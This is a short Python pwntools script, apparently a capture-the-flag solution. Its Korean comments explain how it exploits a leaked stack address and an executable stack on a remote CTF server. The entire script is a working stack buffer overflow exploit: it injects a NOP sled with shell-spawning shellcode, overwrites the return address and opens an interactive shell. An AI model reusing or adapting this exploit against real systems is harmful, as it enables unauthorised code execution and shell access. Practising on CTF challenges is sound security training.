from pwn import *

context(arch='amd64',os='linux')

r = remote("ctf.j0n9hyun.xyz", 3005)

# 프로그램을 실행하면 스택영역의 주소를 준다
# 스택영역에 실행권한이 있으므로
# 이 주소를 이용해 스택영역에 shellcode를 넣고
# ret를 이 주소로 덮어 shellcode를 실행하게 한다
print(r.recvuntil("buf: 0x"))
buf_add = int(r.recvline().strip(), 16)
print("buf :", hex(buf_add))

shellcode = asm(shellcraft.sh())

payload  = b"\x90"*(0x6d00-len(shellcode))
payload += shellcode
payload += b"\x90"*0x38
payload += p64(buf_add+0x100)

r.send(payload)

r.interactive()